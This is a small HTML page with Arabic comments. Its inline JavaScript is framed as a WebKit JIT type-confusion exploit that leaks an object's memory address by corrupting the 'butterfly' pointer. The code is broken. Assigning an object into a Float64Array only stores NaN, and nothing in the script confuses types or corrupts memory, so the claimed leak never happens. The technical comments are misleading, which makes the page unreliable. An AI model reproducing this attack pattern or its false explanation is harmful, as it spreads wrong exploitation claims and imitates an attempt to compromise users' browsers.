<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log">بدء العملية...</div>
<script>
    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

    try {
        log("بدء كسر الـ JIT...");
        
        // 1. مصفوفة تتوقع أرقاماً فقط (Double Array)
        let floatArray = new Float64Array(1);
        
        // 2. مصفوفة تتوقع كائنات (Object Array)
        let objArray = [ { a: 0x1234 } ];
        
        // 3. التداخل: جعل المحرك يظن أن المصفوفتين تشيران لنفس المكان
        // في WebKit، هذا يسمى "Butterfly" pointer corruption
        let butterfly = objArray;
        
        // حيلة الـ JIT:
        // نضع الكائن في مصفوفة الكائنات ونقرأه عبر مصفوفة الأرقام
        let rawMemory = new BigUint64Array(floatArray.buffer);
        
        // هنا نقوم بـ "التداخل" (Type Confusion)
        floatArray[0] = objArray[0]; 
        
        // قراءة التمثيل الثنائي للكائن
        let leak = rawMemory[0];
        
        log("القيمة الثنائية المسربة: " + leak.toString(16));
        
    } catch(e) {
        log("خطأ: " + e.message);
    }
</script>




</body>
</html>
